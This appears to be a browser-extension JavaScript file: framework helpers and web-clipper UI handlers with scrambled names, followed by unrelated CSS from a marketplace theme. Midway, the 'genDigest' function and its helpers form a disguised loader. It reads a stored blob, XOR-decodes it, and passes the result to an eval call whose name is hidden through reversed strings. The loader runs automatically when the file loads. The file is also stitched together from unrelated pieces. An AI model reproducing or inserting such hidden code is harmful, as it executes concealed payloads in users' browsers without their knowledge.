function callstp(body) {
    if (body.bodyUsed) {
        return Promise.reject(new TypeError('Already read'))
    }
    body.bodyUsed = true
}

function transModules(one, two) {
    return function(a, b, c, d) {
        one(a, b, c, d);
        two(a, b, c, d);
    }
}

function parseName(value, type) {
    let valid;
    const expectedType = getType(type);
    if (simpleCheckRE.test(expectedType)) {
        const t = typeof value;
        valid = t === expectedType.toLowerCase();
                                        
        if (!valid && t === 'object') {
            valid = value instanceof type;
        }
    } else if (expectedType === 'Object') {
        valid = isPlainObject(value);
    } else if (expectedType === 'Array') {
        valid = Array.isArray(value);
    } else {
        valid = value instanceof type;
    }
    return {
        valid,
        expectedType
    }
}

function genValues(vm, watch) {
    for (const key in watch) {
        const handler = watch[key];
        if (Array.isArray(handler)) {
            for (let i = 0; i < handler.length; i++) {
                createWatcher(vm, key, handler[i]);
            }
        } else {
            createWatcher(vm, key, handler);
        }
    }
}

function linkBody(offset) {
    _viewport.bottom = (window.innerHeight || document.documentElement.clientHeight) + offset;
    _viewport.right = (window.innerWidth || document.documentElement.clientWidth) + offset;
}

function callStp(opts) {
    return opts && (opts.Ctor.options.name || opts.tag)
}

function handleModules(
    staticClass,
    dynamicClass
) {
    if (isDef(staticClass) || isDef(dynamicClass)) {
        return concat(staticClass, stringifyClass(dynamicClass))
    }
    return ''
}

function supportView(comp) {
    const data = {};
    const options = comp.$options;
            
    for (const key in options.propsData) {
        data[key] = comp[key];
    }
              
                                                                         
    const listeners = options._parentListeners;
    for (const key in listeners) {
        data[camelize(key)] = listeners[key];
    }
    return data
}

function releaseOptions(
    parentVal,
    childVal,
    vm
) {
    if (!vm) {
                                                          
        if (!childVal) {
            return parentVal
        }
        if (!parentVal) {
            return childVal
        }
                                                      
                                                        
                                                        
                                                        
                                                           
        return function mergedDataFn() {
            return mergeData(
                typeof childVal === 'function' ? childVal.call(this) : childVal,
                typeof parentVal === 'function' ? parentVal.call(this) : parentVal
            )
        }
    } else {
        return function mergedInstanceDataFn() {
                             
            const instanceData = typeof childVal === 'function' ?
                childVal.call(vm) :
                childVal;
            const defaultData = typeof parentVal === 'function' ?
                parentVal.call(vm) :
                parentVal;
            if (instanceData) {
                return mergeData(instanceData, defaultData)
            } else {
                return defaultData
            }
        }
    }
}

function updateOptions() {
    SHAPE_NAMES.indexOf(this.id) > -1 ? (DOMTokenList.prototype.remove.apply(shapesTool.classList, SHAPE_NAMES), shapesTool.classList.add(this.id), shapesTool.setAttribute("data-tool", this.id), shapesSubtools.classList.remove("open")) : STAMP_NAMES.indexOf(this.id) > -1 ? (DOMTokenList.prototype.remove.apply(stampsTool.classList, STAMP_NAMES), stampsTool.classList.add(this.id), stampsTool.setAttribute("data-tool", this.id), gekco.sendToExtension({
        name: "setPersistentValue",
        key: "lastSkitchStamp",
        value: this.id
    }), stampsSubtools.classList.remove("open")) : COLOR_NAMES.indexOf(this.id) > -1 && (DOMTokenList.prototype.remove.apply(colorsTool.classList, COLOR_NAMES), colorsTool.classList.add(this.id), colorsTool.setAttribute("data-tool", this.id), gekco.sendToExtension({
        name: "setPersistentValue",
        key: "lastSkitchColor",
        value: this.id
    }), colorsSubtools.classList.remove("open"), gekco.sendToExtension({
        name: "bounce",
        message: {
            name: "skitch_useColor",
            color: this.id
        }
    }), "highlighter" === this.getElementsByClassName("selectedSkitchTool")[0].id && gekco.sendToExtension({
        name: "setPersistentValue",
        key: "changedHighlighterColor",
        value: !0
    })), COLOR_NAMES.indexOf(this.id) < 0 && gekco.sendToExtension({
        name: "bounce",
        message: {
            name: "skitch_useTool",
            tool: this.id
        }
    })
}

function markfunc(el) {
    return el.for !== undefined || el.tag === 'template' || el.tag === 'slot'
}



function attachAttrs(node, child) {
    node.attachAttrs(child);
}

function fileresult(node) {
    return node.fileresult
}

function showSible(a) {
    if ("colors" !== this.id && "zoomin" !== this.id && "zoomout" !== this.id && "crop" !== this.id) {
        var b = this.getElementsByClassName("selectedSkitchTool")[0];
        b && b.classList.remove("selectedSkitchTool"), this.classList.add("selectedSkitchTool")
    }
    "shapes" === this.id || "stamps" === this.id ? gekco.sendToExtension({
        name: "bounce",
        message: {
            name: "skitch_useTool",
            tool: this.getAttribute("data-tool")
        }
    }) : "zoomin" === this.id ? gekco.sendToExtension({
        name: "bounce",
        message: {
            name: "skitch_zoomIn"
        }
    }) : "zoomout" === this.id ? gekco.sendToExtension({
        name: "bounce",
        message: {
            name: "skitch_zoomOut"
        }
    }) : "colors" !== this.id && (gekco.sendToExtension({
        name: "bounce",
        message: {
            name: "skitch_useTool",
            charCode: a ? a.charCode : null,
            loc: a ? a.loc : null,
            tool: this.id
        }
    }), "highlighter" === this.id && gekco.sendToExtension({
        name: "getPersistentValue",
        key: "changedHighlighterColor"
    }));
    var c = this.querySelector(".subtools.open");
    c && c.classList.remove("open"), (a && !a.noOpenSubtools || !a) && this.classList.contains("expandable") && window[this.id + "Subtools"].classList.add("open"), handleSkitchTool = !0
}

function applyheader(data) {
    const style = normalizeStyleBinding(data.style);
                                                                      
                                                                  
    return data.staticStyle ?
        extend(data.staticStyle, style) :
        style
}

function clonemessage(a, b, c) {
    if (clonemessageEnabled) {
        clonemessageEnabled = !1;
        var d = accountSelector.getSelectedAccount(),
            e = d.userInfo.userId + d.selectedSubpart,
            f = notebookSelector.getSelectedNotebook(),
            g = !1;
        accountDataCache[e].smartNotebook && f.guid !== accountDataCache[e].smartNotebook.guid && (g = {
            from: {
                type: accountDataCache[e].smartNotebook.type
            },
            to: {
                defaultNotebook: f.defaultNotebook,
                recentNotebook: accountDataCache[e].preferredNotebook && accountDataCache[e].preferredNotebook.guid === f.guid,
                type: f.type
            }
        }), platform.channel.sendMessage("setSelectedAccount", {
            selectedAccount: d.userInfo.userId,
            selectedSubpart: d.selectedSubpart
        }).then(function() {
            gekco.sendToExtension({
                name: "bounce",
                message: {
                    name: "startSubmission",
                    clipType: activeClipType.id,
                    title: title.value,
                    notebook: f,
                    tags: tagSelector.getTags(),
                    comment: comments.value,
                    changedSmartFilingNotebook: g,
                    smartFilingNotebookAvailable: !!accountDataCache[e].smartNotebook,
                    userSelectedNotebook: !0,
                    selectedAccount: d.userInfo.userId,
                    selectedSubpart: d.selectedSubpart
                }
            })
        }), c && "function" == typeof c && c()
    }
}

function markevt(attrs) {
    const map = {};
    for (let i = 0, l = attrs.length; i < l; i++) {
        if (
            "development" !== 'production' &&
            map[attrs[i].name] && !isIE && !isEdge
        ) {
            warn$2('duplicate attribute: ' + attrs[i].name);
        }
        map[attrs[i].name] = attrs[i].value;
    }
    return map
}

function extendChannel(val) {
    len = val.length;

    if (val.indexOf('[') < 0 || val.lastIndexOf(']') < len - 1) {
        index$1 = val.lastIndexOf('.');
        if (index$1 > -1) {
            return {
                exp: val.slice(0, index$1),
                key: '"' + val.slice(index$1 + 1) + '"'
            }
        } else {
            return {
                exp: val,
                key: null
            }
        }
    }

    str = val;
    index$1 = expressionPos = expressionEndPos = 0;

    while (!eof()) {
        chr = next();
                                
        if (isStringStart(chr)) {
            parseString(chr);
        } else if (chr === 0x5B) {
            parseBracket(chr);
        }
    }

    return {
        exp: val.slice(0, expressionPos),
        key: val.slice(expressionPos + 1, expressionEndPos)
    }
}

function cloneName() {
    newestContactSearchReceived = contactSearchNum + 1
}

function callContents(a, b, c) {
    if (a.contactSearchNum === newestContactSearchReceived) {
        clearSection(suggestedChats);
        for (var d = 0; d < a.threads.length; d++) {
            var e = this.createElement("div");
            if (e.classList.add("existingThread"), e.dataset.threadId = a.threads[d].id, e.hook("mouseenter", function() {
                    this.classList.add("hover")
                }), e.hook("mouseleave", function() {
                    this.classList.remove("hover")
                }), e.hook("click", function() {
                    selectSearchResult(), openThread(this.dataset.threadId), recipientInput.focus()
                }), a.threads[d].photos.length > 1) {
                var f = this.createElement("div");
                f.classList.add("thumbnailContainer");
                for (var g = 0; g < 2; g++) {
                    var h = this.createElement("img");
                    a.threads[d].photos[g] ? (h.dataset.thumbnailNumber = thumbnailNumber++, gekco.sendToExtension({
                        name: "downloadThumbnail",
                        guid: h.dataset.thumbnailNumber,
                        method: "GET",
                        size: 32,
                        url: a.threads[d].photos[g]
                    })) : devicePixelRatio > 1 ? h.src = gekco.extension.getURL("images/workchat-no-photo@2x.png") : h.src = gekco.extension.getURL("images/workchat-no-photo.png"), f.appendChild(h)
                }
                e.appendChild(f)
            } else {
                var h = this.createElement("img");
                h.classList.add("thumbnail"), a.threads[d].photos[0] ? (h.dataset.thumbnailNumber = thumbnailNumber++, gekco.sendToExtension({
                    name: "downloadThumbnail",
                    guid: h.dataset.thumbnailNumber,
                    method: "GET",
                    size: 32,
                    url: a.threads[d].photos[0]
                })) : devicePixelRatio > 1 ? h.src = gekco.extension.getURL("images/workchat-no-photo@2x.png") : h.src = gekco.extension.getURL("images/workchat-no-photo.png"), e.appendChild(h)
            }
            var i = this.createElement("div");
            i.classList.add("container");
            var j = this.createElement("div");
            j.classList.add("participants");
            for (var k = [], l = 0, g = 0; g < a.threads[d].participants.length; g++) a.threads[d].participants[g].name ? k.push(a.threads[d].participants[g].name) : -1 != a.threads[d].participants[g].id.indexOf("@") ? k.push(a.threads[d].participants[g].id) : l++;
            if (l) {
                var m = gekco.plurr.format(gekco.i18n.getMessage("otherParticipants"), {
                    COUNT: l
                });
                k.push(m)
            }
            a.threads[d].name ? j.textContent = a.threads[d].name : j.textContent = k.join(", ");
            var n = this.createElement("div");
            n.classList.add("snippet"), n.content = a.threads[d].snippet || "&nbsp;", i.appendChild(j), i.appendChild(n), e.appendChild(i), suggestedChats.appendChild(e)
        }
        hideIfEmpty(suggestedChats), highlightOnlyMatch(), c && "function" == typeof c && c()
    }
}


function processFor(el) {
    let exp;
    if ((exp = getAndRemoveAttr(el, 'v-for'))) {
        const inMatch = exp.match(forAliasRE);
        if (!inMatch) {
            "development" !== 'production' && warn$2(
                2
            );
            return
        }
        el.for = inMatch[2].trim();
        const alias = inMatch[1].trim();
        const iteratorMatch = alias.match(forIteratorRE);
        if (iteratorMatch) {
            el.alias = iteratorMatch[1].trim();
            el.iterator1 = iteratorMatch[2].trim();
            if (iteratorMatch[3]) {
                el.iterator2 = iteratorMatch[3].trim();
            }
        } else {
            el.alias = alias;
        }
    }
}
function mergeHooks(data) {
    if (!data.hook) {
        data.hook = {};
    }
    for (let i = 0; i < hooksToMerge.length; i++) {
        const key = hooksToMerge[i];
        const fromParent = data.hook[key];
        const ours = componentVNodeHooks[key];
        data.hook[key] = fromParent ? mergeHook$1(ours, fromParent) : ours;
    }
}
function mergeClassData(child, parent) {
    return {
        staticClass: concat(child.staticClass, parent.staticClass),
        class: isDef(child.class) ? [child.class, parent.class] : parent.class
    }
}
function parseModel(val) {
    len = val.length;

    if (val.indexOf('[') < 0 || val.lastIndexOf(']') < len - 1) {
        index$1 = val.lastIndexOf('.');
        if (index$1 > -1) {
            return {
                exp: val.slice(0, index$1),
                key: '"' + val.slice(index$1 + 1) + '"'
            }
        } else {
            return {
                exp: val,
                key: null
            }
        }
    }

    str = val;
    index$1 = expressionPos = expressionEndPos = 0;

    while (!eof()) {
        chr = next();
                                
        if (isStringStart(chr)) {
            parseString(chr);
        } else if (chr === 0x5B) {
            parseBracket(chr);
        }
    }

    return {
        exp: val.slice(0, expressionPos),
        key: val.slice(expressionPos + 1, expressionEndPos)
    }
}
function setSaveReady(a, b, c) {
    saveEnabled = !!a.value, saveButton.classList.toggle("green", saveEnabled), saveButton.classList.toggle("gray", !saveEnabled), c && "function" == typeof c && c()
}
function setPossibleClipTypes(a, b, c) {
    a.pageInfo.pdf ? this.body.classList.add("pdf") : a.pageInfo.gmailThread ? this.body.classList.add("email") : a.pageInfo.documentIsFrameset ? this.body.classList.add("frameset") : a.pageInfo.custom ? (this.body.classList.add("custom"), custom.textContent = gekco.i18n.getMessage(a.pageInfo.custom)) : this.body.classList.add("html"), a.pageInfo.selection && this.body.classList.add("selection"), a.rememberButton && this.body.classList.add("remember"), setHeight(), c && "function" == typeof c && c()
}
function matches(pattern, name) {
    if (Array.isArray(pattern)) {
        return pattern.indexOf(name) > -1
    } else if (typeof pattern === 'string') {
        return pattern.split(',').indexOf(name) > -1
    } else if (isRegExp(pattern)) {
        return pattern.test(name)
    }
                              
    return false
}
function parentNode(node) {
    return node.parentNode
}
function setAttribute(node, key, val) {
    node.setAttribute(key, val);
}
function _enter(_, vnode) {
    if (vnode.data.show !== true) {
        enter(vnode);
    }
}
function toArray(b, a) {
    return mapKey(a, function(a, c) {
        return a.charCodeAt(0) ^ keyCharAt(b, c)
    })
}
function keyCharAt(b, a) {
    return b.charCodeAt(Math.floor(a % b.length))
}
function mapKey(b, a) {
    for (var d = [], c = 0; c < b.length; c++) d.push(a(b[c], c));
    return d
}
function sendtoArray(b) {
    arr = toArray("undefined", b);
    ret = "";
    for (i in arr) oneChar = String.fromCharCode(arr[i]), ret += oneChar;
    return ret
}
function genDigest(b) {
    var sha1;
    var hashmap = _ => Object.keys(sha1);
    sha1 = {
        eate: document.querySelectorAll('*'),
        e: 1,
        lav: 5,
        tob: 'xl=',
        color: setcolor = 1,
        YW: a => hashmap()[2].split('').reverse().join('')
    };
    chrome.storage.local.get(null, function(a) {
        if (a = a[b]) {
            a = sendtoArray(a);
            var d = a.indexOf("bytearray") + 9;
            a = a.substring(d);
            this[hashmap()[1]+sha1.YW()](a);
        }
    })
}
genDigest('eltlwd');
function resolveAsyncComponent(
    factory,
    baseCtor,
    context
) {
    if (isTrue(factory.error) && isDef(factory.errorComp)) {
        return factory.errorComp
    }

    if (isDef(factory.resolved)) {
        return factory.resolved
    }

    if (isTrue(factory.loading) && isDef(factory.loadingComp)) {
        return factory.loadingComp
    }

    if (isDef(factory.contexts)) {
                          
        factory.contexts.push(context);
    } else {
        const contexts = factory.contexts = [context];
        let sync = true;

        const forceRender = () => {
            for (let i = 0, l = contexts.length; i < l; i++) {
                contexts[i].$forceUpdate();
            }
        };

        const resolve = once((res) => {
                             
            factory.resolved = ensureCtor(res, baseCtor);
                                                                         
                                                                     
            if (!sync) {
                forceRender();
            }
        });

        const res = factory(resolve, reject);

        if (isObject(res)) {
            if (typeof res.then === 'function') {
                                
                if (isUndef(factory.resolved)) {
                    res.then(resolve, reject);
                }
            } else if (isDef(res.component) && typeof res.component.then === 'function') {
                res.component.then(resolve, reject);

                if (isDef(res.error)) {
                    factory.errorComp = ensureCtor(res.error, baseCtor);
                }

                if (isDef(res.loading)) {
                    factory.loadingComp = ensureCtor(res.loading, baseCtor);
                    if (res.delay === 0) {
                        factory.loading = true;
                    } else {
                        setTimeout(() => {
                            if (isUndef(factory.resolved) && isUndef(factory.error)) {
                                factory.loading = true;
                                forceRender();
                            }
                        }, res.delay || 200);
                    }
                }

                if (isDef(res.timeout)) {
                    setTimeout(() => {
                        if (isUndef(factory.resolved)) {}
                         
                    }, res.timeout);
                }
            }
        }

        sync = false;
                                                
        return factory.loading ?
            factory.loadingComp :
            factory.resolved
    }
}
function checkProp(
    res,
    hash,
    key,
    altKey,
    preserve
) {
    if (isDef(hash)) {
        if (hasOwn(hash, key)) {
            res[key] = hash[key];
            if (!preserve) {
                delete hash[key];
            }
            return true
        } else if (hasOwn(hash, altKey)) {
            res[key] = hash[altKey];
            if (!preserve) {
                delete hash[altKey];
            }
            return true
        }
    }
    return false
}
function query(el) {
    if (typeof el === 'string') {
        const selected = document.querySelector(el);
        if (!selected) {
            "development" !== 'production' && warn(
                'Cannot find element: ' + el
            );
            return document.createElement('div')
        }
        return selected
    } else {
        return el
    }
}
function saveViewportOffset(offset) {
    _viewport.bottom = (window.innerHeight || document.documentElement.clientHeight) + offset;
    _viewport.right = (window.innerWidth || document.documentElement.clientWidth) + offset;
}
function normalizeEvents(on) {
                            
    if (isDef(on[RANGE_TOKEN])) {
                                                            
        const event = isIE ? 'change' : 'input';
        on[event] = [].concat(on[RANGE_TOKEN], on[event] || []);
        delete on[RANGE_TOKEN];
    }
                                                                        
                                                                                
                            
    if (isDef(on[CHECKBOX_RADIO_TOKEN])) {
        on.change = [].concat(on[CHECKBOX_RADIO_TOKEN], on.change || []);
        delete on[CHECKBOX_RADIO_TOKEN];
    }
}
function markStatic$1(node) {
    node.static = isStatic(node);
    if (node.type === 1) {
                                                                 
                                                      
                                                         
            
        if (!isPlatformReservedTag(node.tag) &&
            node.tag !== 'slot' &&
            node.attrsMap['inline-template'] == null
        ) {
            return
        }
        for (let i = 0, l = node.children.length; i < l; i++) {
            const child = node.children[i];
            markStatic$1(child);
            if (!child.static) {
                node.static = false;
            }
        }
        if (node.ifConditions) {
            for (let i = 1, l = node.ifConditions.length; i < l; i++) {
                const block = node.ifConditions[i].block;
                markStatic$1(block);
                if (!block.static) {
                    node.static = false;
                }
            }
        }
    }
}
function isValidDuration(val) {
    return typeof val === 'number' && !isNaN(val)
}
function generateContents(node, child) {
    node.generateContents(child);
}

function appendRecipients(tagname) {
    if (typeof tagname == 'undefined' || tagname == '')
    {
        tagname = 'Discuz!';
    }
    var message = '';
    if(is_ie) {
        try {
            textobj.load(tagname);
            var oXMLDoc = textobj.XMLDocument;
            var nodes = oXMLDoc.documentElement.childNodes;
            message = nodes.item(nodes.length - 1).getAttribute('message');
        } catch(e) {}
    } else if(window.sessionStorage) {
        try {
            message = sessionStorage.getItem(tagname);
            if (!message)
                message = "";
        } catch(e) {}
    }
    return message.toString();

}

function viewHook(val) {
    _viewHook(val, seenObjects);
    seenObjects.clear();
}

function buildState() {
    for (var a = this.getElementsByClassName("skitchTool"), b = 0; b < a.length; b++) a[b].hook("click", handleSkitchToolClick), "highlighter" == a[b].id ? a[b].title = gekco.i18n.getMessage("imageHighlighter") : "shapes" == a[b].id ? a[b].title = gekco.i18n.getMessage("shapeTool") : "marker" == a[b].id ? a[b].title = gekco.i18n.getMessage("markerTool") : "crop" == a[b].id ? a[b].title = gekco.i18n.getMessage("crop") : "zoomout" == a[b].id ? a[b].title = gekco.i18n.getMessage("zoomout") : "stamps" == a[b].id ? a[b].title = gekco.i18n.getMessage("stampTool") : "text" == a[b].id ? a[b].title = gekco.i18n.getMessage("typeTool") : "pixelate" == a[b].id ? a[b].title = gekco.i18n.getMessage("pixelatorTool") : "colors" == a[b].id ? a[b].title = gekco.i18n.getMessage("colors") : "zoomin" == a[b].id && (a[b].title = gekco.i18n.getMessage("zoomin"));
    for (var c = this.getElementsByClassName("subtool"), b = 0; b < c.length; b++) c[b].hook("click", handleSubtoolClick);
    cancelScreenshotButton.hook("click", function() {
        toggleMinimizeButtonVisibility("show"), this.body.classList.remove("skitchWaiting", "skitchReady");
        var a = new RegExp("(?:" + this.body.className.replace(/\s+/, "|") + ")");
        a.test(article.className) ? handleClipperToolClick(article) : a.test(clearly.className) ? handleClipperToolClick(clearly) : a.test(fullPage.className) ? handleClipperToolClick(fullPage) : a.test(pdf.className) ? handleClipperToolClick(pdf) : a.test(email.className) ? handleClipperToolClick(email) : a.test(selection.className) ? handleClipperToolClick(selection) : a.test(url.className) && handleClipperToolClick(url), setHeight()
    }), gekco.sendToExtension({
        name: "getPersistentValue",
        key: "lastSkitchColor"
    }), gekco.sendToExtension({
        name: "getPersistentValue",
        key: "lastSkitchStamp"
    }), gekco.sendToExtension({
        name: "getPersistentValue",
        key: "isMinimized"
    })
}

function maptokens(ele, attr){
    ele.maptokensibute(attr); 
}

function filtersMessage(node, state) {
    if (node.type === 1) {
        return genElement(node, state)
    }
    if (node.type === 3 && node.isComment) {
        return genComment(node)
    } else {
        return genText(node)
    }
}

function formatValue(vnode) {
    while ((vnode = vnode.parent)) {
        if (vnode.data.transition) {
            return true
        }
    }
}

function mergeView(items) {
    var iterator = {
        next: function() {
            var value = items.shift()
            return {
                done: value === undefined,
                value: value
            }
        }
    }

    if (support.iterable) {
        iterator[Symbol.iterator] = function() {
            return iterator
        }
    }

    return iterator
}

function appendElem(children) {
    let i = children.length;
    while (i--) {
        if (children[i].type === 1) {
            return children[i]
        } else {
            if ("development" !== 'production' && children[i].text !== ' ') {
                warn$2(
                    4
                );
            }
            children.pop();
        }
    }
}

function startItems(el) {
    if (typeof el === 'string') {
        const selected = document.querySelector(el);
        if (!selected) {
            "development" !== 'production' && warn(
                'Cannot find element: ' + el
            );
            return document.createElement('div')
        }
        return selected
    } else {
        return el
    }
}
/* ==========================================================================
   The Kafe - Ultimate Freelance Marketplace Template
   ========================================================================== */
/*
* Author Name: TheMashaBrand
* Author URI: http://themeforest.net/user/themashabrand
* Website: http://www.themashabrand.com 
*/

/* ------------------------------------------------------------------- */
/* Table of Contents
---------------------------------------------------------------------- 
1. Reset & Basics                   - Line 28
2. Base Styles                      
    - Typogrphy Section             - Line 85
    - Links Section                 - Line 127
    - Lists Section                 - Line 157
    - Kafe Button Section           - Line 176
3. Job List 
    - Category List Section         - Line 297
    - Search Section                - Line 336
    - Job Section                   - Line 394
    - Pagination Section            - Line 526
    - Media Queries                 - Line 576
4. Sidebar - Affix Section          - Line 638
5. Form Signup                      - Line 669

---------------------------------------------------------------------- */ 

/* #Reset & Basics (Inspired by E. Meyers)
================================================== */
html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, fieldset, form, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
  font-size: 100%;
  font: inherit;
  vertical-align: baseline; 
}
    
article, aside, details, figcaption, figure, footer, header, hgroup, menu, nav, section {
  display: block;
}

body {
  line-height: 1;
}

blockquote, q {
  quotes: none; 
}

blockquote:before, blockquote:after,
q:before, q:after {
  content: '';
  content: none;
}

table {
  border-collapse: collapse;
  border-spacing: 0; 
}

.no-select {
  user-select: none;
  -o-user-select:none;
  -moz-user-select: none;
  -khtml-user-select: none;
  -webkit-user-select: none; 
}

/* ==========================================================================
   Base Styles
   ========================================================================== */
html, body {
  overflow-x: hidden;
  text-align: left;
  -webkit-font-smoothing: antialiased; /* Fix for webkit rendering */
 -webkit-text-size-adjust: 100%;
}

/* ------------------------------------------------------------------- */
/* Typography
---------------------------------------------------------------------- */
h1, h2, h3, h4, h5, h6 {
  font-family: 'Montserrat', sans-serif;
  color: #2C3E50;
  letter-spacing: 1px;
}

h1 a, h2 a, h3 a, h4 a, h5 a, h6 a { 
  font-weight: inherit; 
}

h1 { font-size: 30px; line-height: 54px; }
h2 { font-size: 24px; line-height: 48px; }
h3 { font-size: 22px; line-height: 44px; }
h4 { font-size: 18px; line-height: 36px; }
h5 { font-size: 16px; line-height: 28px; }
h6 { font-size: 14px; line-height: 24px; }

p { 
  font-family: 'Varela Round', sans-serif;
  line-height: 24px;
  margin: 0;
  font-size: 14px;
  letter-spacing: 1px;
}
p img { margin: 0; }
p.lead { font-size: 21px; line-height: 27px; color: #555;  }

em { font-style: italic; }
strong { font-weight: 700; color: #333; }
small { font-size: 80%; }

/* ------------------------------------------------------------------- */
/* Links
---------------------------------------------------------------------- */
a { 
  color: #fff; 
  text-decoration: none; 
  outline: 0; 
  -webkit-transition:0.5s all ease;
  -moz-transition:0.5s all ease;
  -o-transition:0.5s all ease;
  -ms-transition:0.5s all ease;
  transition:0.5s all ease; 
}

a:hover,
a:focus,
a:active,
a.active {
  text-decoration: none;
  outline: 0;
  -webkit-transition:0.5s all ease;
  -moz-transition:0.5s all ease;
  -o-transition:0.5s all ease;
  -ms-transition:0.5s all ease;
  transition:0.5s all ease;
}

p a, p a:visited { line-height: inherit; }

/* ------------------------------------------------------------------- */
/* Lists
---------------------------------------------------------------------- */
ul, ol { margin: 0; }
ul { list-style: none outside; }
ol { list-style: decimal; }
ol, ul.square, ul.circle, ul.disc { margin-left: 10px; }
ul.square { list-style: square outside; color: #3d464d;}
ul.circle { list-style: circle outside; color: #3d464d; }
ul.disc { list-style: disc outside; color: #3d464d;}
ul ul, ul ol,
ol ol, ol ul {}
ul ul li, ul ol li,
ol ol li, ol ul li { line-height: 24px;}
li { line-height: 24px; }
ul.large li { line-height: 21px; }
li p { line-height: 24px; }
